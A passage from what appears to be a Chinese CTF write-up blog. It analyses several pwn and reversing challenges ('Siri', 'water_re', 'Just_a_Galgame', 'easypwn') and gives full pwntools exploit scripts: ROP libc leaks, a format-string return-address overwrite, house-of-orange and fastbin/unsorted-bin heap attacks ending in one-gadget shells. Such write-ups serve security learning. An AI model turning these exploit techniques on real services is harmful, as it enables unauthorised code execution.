gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()pop_rdi = <span class="hljs-number">0x0000000000400ac3</span>start = <span class="hljs-number">0x04006E0</span>sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)sa(<span class="hljs-string">'name'</span>,p32(<span class="hljs-number">0xffff</span>))sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)sa(<span class="hljs-string">'mes'</span>,payload)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)rop = flat([pop_rdi,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],start])payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)payload +=ropsa(<span class="hljs-string">'mes'</span>,payload)ru(<span class="hljs-string">'done!'</span>)r(<span class="hljs-number">2</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)sa(<span class="hljs-string">'name'</span>,p32(<span class="hljs-number">0xffff</span>))sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-comment"># debug()</span>payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)sa(<span class="hljs-string">'mes'</span>,payload)rec = <span class="hljs-number">0x10a45c</span> + libc_basesla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)rop = p64(rec)payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)payload +=ropsa(<span class="hljs-string">'mes'</span>,payload)itr()</code></pre></div><div class="hljs"><pre><code class="hljs python">flag&#123;f4c1c2c2407055f2665dec486e7d1b16&#125;</code></pre></div><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>保护全开。栈上的格式化字符串漏洞，并且可以无限次触发。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_1212</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1)</span></span>&#123;  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// [rsp+18h] [rbp-128h]</span>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+20h] [rbp-120h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+138h] [rbp-8h]</span>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);  v2 = <span class="hljs-built_in">strstr</span>(a1, <span class="hljs-string">"Remind me to "</span>);  <span class="hljs-keyword">if</span> ( !v2 )    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x110</span>uLL);  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"&gt;&gt;&gt; OK, I'll remind you to %s"</span>, v2 + <span class="hljs-number">13</span>);  <span class="hljs-built_in">printf</span>(&amp;s);  <span class="hljs-built_in">puts</span>(&amp;::s);  <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;&#125;</code></pre></div><p>发现存在格式化字符串，但是你所输入的都会被sprintf处理以后给printf函数。由于其是<code>%s</code>来处理数据，这就让直接在栈上写地址，然后攻击造成了难度。<br>但是调试可以发现，其实输入的东西还会保留在栈上，因为sprintf处理数据也是从栈上拿的，所以会被保留的。</p><h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><ul><li>第一次触发，泄漏出libc地址，stack地址。</li><li>执行到printf准备触发格式化字符串漏洞时，用sprintf残留栈上的数据（在0x100后），这个需要精心构造好后，进行攻击ret address。需要一次性改好。</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.170.202'</span>,<span class="hljs-number">12124</span>)    <span class="hljs-comment"># libc = elf.libc</span>    libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_attc</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'Hey Siri!'</span>)    r()a = <span class="hljs-string">'Remind me to '</span>start_attc()payload = str(a) + <span class="hljs-string">'%83$p'</span> + <span class="hljs-string">'bbb'</span> + <span class="hljs-string">'%7$p'</span><span class="hljs-comment"># ru('&gt;&gt;&gt;')</span>s(payload)ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x21b97</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)ru(<span class="hljs-string">'bbb0x'</span>)stack_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x150</span>info_addr(<span class="hljs-string">'stack_base'</span>,stack_base)tag = stack_base + <span class="hljs-number">0x148</span>start_attc()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">27</span>fmtpayload = <span class="hljs-string">""</span>key = <span class="hljs-number">0x4f365</span> + libc_baseinfo_addr(<span class="hljs-string">'key'</span>,key)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    fmtpayload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">55</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>print(fmtpayload)payload = str(a) + fmtpayloadpayload +=<span class="hljs-string">'aaa'</span> + <span class="hljs-string">'b'</span> + p64(tag)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span> + p64(tag+<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span>  + p64(tag+<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span> + p64(tag+<span class="hljs-number">6</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span>s(payload)itr()</code></pre></div><div class="hljs"><pre><code class="hljs python">flag&#123;da8836b9e9df3db44fe4bd7f39d4f7ab&#125;</code></pre></div><h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Ida反编译后的代码比较难看，发现重点数据造成了困难，就采取动态调试。</p><p>基本流程就是，gets一段你输入的flag，读入后用<code>sub_12f0_</code>进行处理，然后给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。其实也就是一个个字符来进行对比。</p><h3 id="sub-12F0-加密函数"><a href="#sub-12F0-加密函数" class="headerlink" title="sub_12F0_加密函数"></a><code>sub_12F0_</code>加密函数</h3><div class="hljs"><pre><code class="hljs python">_BYTE *__fastcall sub_12F0(_BYTE *a1)&#123;  _BYTE *result; // rax  int v2; // esi  __int64 v3; // r8  __int64 v4; // rdx  __int64 v5; // rax  int v6; // ecx  char v7; // r8  char v8; // dl  __asm &#123; endbr64 &#125;  result = (_BYTE *)sub_1090();  <span class="hljs-keyword">if</span> ( (signed int)result &lt;= <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> result;  v2 = (signed int)result;  v3 = (unsigned int)((_DWORD)result - <span class="hljs-number">1</span>);  v4 = <span class="hljs-number">0L</span>L;  do  &#123;    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % <span class="hljs-number">7</span>]) + <span class="hljs-number">65</span>;    v5 = v4++;  &#125;  <span class="hljs-keyword">while</span> ( v3 != v5 );  v6 = <span class="hljs-number">0</span>;  do  &#123;    v7 = a1[<span class="hljs-number">3</span>];    result = a1 + <span class="hljs-number">3</span>;    do    &#123;      v8 = *(result-- - <span class="hljs-number">1</span>);      result[<span class="hljs-number">1</span>] = v8;    &#125;    <span class="hljs-keyword">while</span> ( a1 != result );    v6 += <span class="hljs-number">4</span>;    *a1 = v7;    a1 += <span class="hljs-number">4</span>;  &#125;  <span class="hljs-keyword">while</span> ( v2 &gt; v6 );  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>动态调试，进行起来很容易看懂。上来就是一个对输入的东西进行一个与<code>byte_4010</code>的字符<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7组来进行一个异或和+65。</p><p>然后下面：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">while</span> ( v3 != v5 ); v6 = <span class="hljs-number">0</span>; do &#123;   v7 = a1[<span class="hljs-number">3</span>];   result = a1 + <span class="hljs-number">3</span>;   do   &#123;     v8 = *(result-- - <span class="hljs-number">1</span>);     result[<span class="hljs-number">1</span>] = v8;   &#125;   <span class="hljs-keyword">while</span> ( a1 != result );   v6 += <span class="hljs-number">4</span>;   *a1 = v7;   a1 += <span class="hljs-number">4</span>; &#125;</code></pre></div><p>只看着让人头大，输入<code>flag{11111111111111111111111111111111111111111}</code> 动态调试一下发现：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p><p>分析这2组数据就会发现，每次对4个数据为一组进行处理。处理后结果就是原来的： <code>v1 &gt; v2 &gt; v3 &gt; v4</code> 变为 <code>v4 &gt; v1 &gt; v2 &gt; v3</code> 这样的结果。</p><p>然后处理完就给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。这肯定为一串处理过的字符串，ida中也可以找到，直接提取有点害怕提取错，动调时提取一下出来：</p><div class="hljs"><pre><code class="hljs python">tag1=[<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>]</code></pre></div><p>也就是这一段数据。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>自己直接手动替换的数据。</p><div class="hljs"><pre><code class="hljs python">tag1=[<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>]tag2 = [<span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>,<span class="hljs-number">0x54</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x5C</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>,<span class="hljs-number">0x6D</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>,<span class="hljs-number">0x5E</span>]qwkey = [<span class="hljs-string">'Q'</span>, <span class="hljs-string">'W'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'s'</span>]flag = <span class="hljs-string">''</span>i = <span class="hljs-number">0</span>j = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tag2)):    <span class="hljs-keyword">if</span> j ==<span class="hljs-number">7</span>:        j = <span class="hljs-number">0</span>    flag += chr((tag2[i] - <span class="hljs-number">65</span>) ^ ord(qwkey[j % <span class="hljs-number">7</span>]))    j += <span class="hljs-number">1</span>print(str(flag))</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>估计没有提取全，但是也很容易知道flag了。</p><div class="hljs"><pre><code class="hljs python">flag&#123;QWB_water_problem_give_you_the_score&#125;</code></pre></div><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>题目提醒了是house of orange，那就想着这样利用即可。现在house of orange的思想，统指主要是针对没有free的堆题，其改top chunk，然后申请一个大点的chunk，来进行获取一个进入unsortbin 的堆块。没有如最早的很经典的利用unsortbin attack 和 io 结合来获取shell。</p><p>题目的case2 <code>Invite her to go to a movie.</code> 中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"movie name &gt;&gt; "</span>, &amp;buf);          v4 = atoi((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;buf);          read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)(qword_404060[v4] + <span class="hljs-number">0x60</span>), <span class="hljs-number">0x10</span>uLL);</code></pre></div><p>由于其是在加0x60之后读取，且在case 1 只是malloc(0x68)，所以在此处可以溢出8个字节，改写到 top chunk。</p><p>并且case3：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"You are the apple of my eyes too!"</span>);        qword_404098 = (__int64)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);        ++v12;</code></pre></div><p>可以给你申请0x1000的堆块，这就可以实现了house of orange。</p><p>在case5中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"\nHotaru: Won't you stay with me for a while? QAQ\n"</span>);      read(<span class="hljs-number">0</span>, &amp;key, <span class="hljs-number">8u</span>LL);</code></pre></div><p>会给<code>0x4040A0</code> 读一段数据。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>是紧挨着堆块的。然而在case2中在edit时也没有对堆块序号的检查,让个人输入个8 即可取到这里，进行编辑。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>house of orange来获取一个unsortbin </li><li>申请一个堆块，会在这个old top chunk中，切出一个堆块，其上会存在libc的相关地址</li><li>show一下，泄漏出libc base</li><li>leave <code>__malloc_hook - 0x60</code>的地址在<code>key</code> 处，然后进行编辑这里的数据。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./Just_a_Galgame'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">"&gt;&gt;"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add100</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">(buf)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)    s(str(buf))add()payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0xd41</span>)edit(<span class="hljs-number">0</span>,payload)add100()add()show()ru(<span class="hljs-string">'1: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ec2a0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)leave(p64(libc_base + <span class="hljs-number">0x3ebc30</span> - <span class="hljs-number">0x60</span>))one_rec = <span class="hljs-number">0x4f3c2</span> + libc_baseedit(<span class="hljs-number">8</span>,p64(one_rec))add()itr()</code></pre></div><p>还是挺简单的，比赛时竟然没有看这个题。</p><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</code></pre></div><ul><li><p>禁用了fastbin，原理就是修改<code>global_max_fast</code> = 0x10</p></li><li><p>存在off by null</p></li><li><p>没有show功能</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3></li><li><p>利用off by null ，修改unsorted bin 的bk为<code>global_max_fast - 0x10</code></p></li><li><p>利用unsorted bin 攻击 <code>global_max_fast</code></p></li><li><p>接着fastbin attack 打io file的stdout，泄漏libc</p></li><li><p>接着fastbin attack打 <code>malloc_hook</code> 为one gadget</p></li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./easypwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'39.101.184.181'</span>,<span class="hljs-number">10000</span>)    libc = elf.libc    <span class="hljs-comment"># libc = ELF('./libc-easypwn.so')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span>    add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#3</span>    add(<span class="hljs-number">0x40</span>)    delete(<span class="hljs-number">0</span>)    <span class="hljs-comment">#null off by one</span>    edit(<span class="hljs-number">1</span>,<span class="hljs-string">'d'</span>*<span class="hljs-number">0x90</span> + p64(<span class="hljs-number">0xa0</span> + <span 